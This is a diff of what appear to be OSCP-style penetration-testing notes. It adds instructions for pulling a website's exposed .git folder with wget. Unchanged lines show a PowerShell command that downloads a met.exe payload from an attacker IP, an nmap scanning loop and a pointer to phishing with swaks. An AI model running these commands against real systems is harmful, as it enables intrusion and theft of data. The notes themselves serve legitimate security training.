@@ -95,3 +95,12 @@ iwr -uri http://192.168.119.2/met.exe -Outfile met.exe
 | `mkdir nmap`<br>`for i in $(cat scope.txt); do sudo nmap -p- --min-rate=10000 --open $i -oG nmap/$i; done`<br>`cd nmap`<br>`for i in $(ls \| grep -v '.nmap'); do extractPorts $i; export clipboard_content=`xclip -o -selection clipboard`; nmap -p $clipboard_content -sCV -A -T4 $i -oN "$i.nmap"; done` | Script to process scope.txt file |
 
 **Phising:** Refer to PEN-200 content, 24.3.2 module and use swaks
+
+#### Git repository leaked
+If we face a website which has its .git folder uploaded, we can download the content with wget and look for some info in commits
+```bash
+wget -r https://www.port-local-delivery.com/.git
+cd website-content
+git show
+```
+
